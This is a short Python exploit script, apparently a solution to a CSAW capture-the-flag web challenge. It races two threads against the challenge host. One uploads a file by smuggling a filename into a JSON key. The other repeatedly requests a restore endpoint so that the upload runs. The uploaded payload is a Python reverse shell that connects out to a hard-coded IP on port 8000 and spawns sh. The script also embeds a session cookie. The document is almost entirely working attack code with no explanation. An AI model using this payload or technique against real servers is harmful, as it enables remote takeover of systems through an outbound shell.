import requests
from threading import Thread
# url = "http://localhost:1337"
url = "https://charliesangels.ctf.csaw.io"

s = requests.session() 
sid = "s%3A6sYTAK-OhnHZf4dMbZhEg0fknaq96oSJ.UxbNh90fXTULRj2n8LaXIuW%2BGfjuzOjfLVjM9dZj9a4"
payload = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("54.180.232.94",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")"""
sessionID = "rTnh8ZCH6BkfMlpgiAr6hLiYBOylWf6G"

def go1(): 
        
    while True:
        r = s.post(
            f"{url}/angel", 
            headers={
                "connect.sid": sid
            },
            json={
                "angel": {
                    "name": "test", 
                    "actress":"test",
                    "movie": "test", 
                    "talents": {
                        "0":"Intuition",
                        "1":"Skiing",
                        "2":"Gun Wielding"
                    },
                },
                f"file\"; filename=\"{sessionID}.py": payload
            }
        )
        print(r.text)

def go2():
    while True:
        r = s.get(
            f"{url}/restore",
            headers={
                "connect.sid": sid
            },
        )
        if not "<h1>ERROR!</h1>" in r.text:
            print(r.text)

thr1 = Thread(target=go1,)
thr2 = Thread(target=go2,) 

thr1.start()
thr2.start() 

thr1.join()
thr2.join()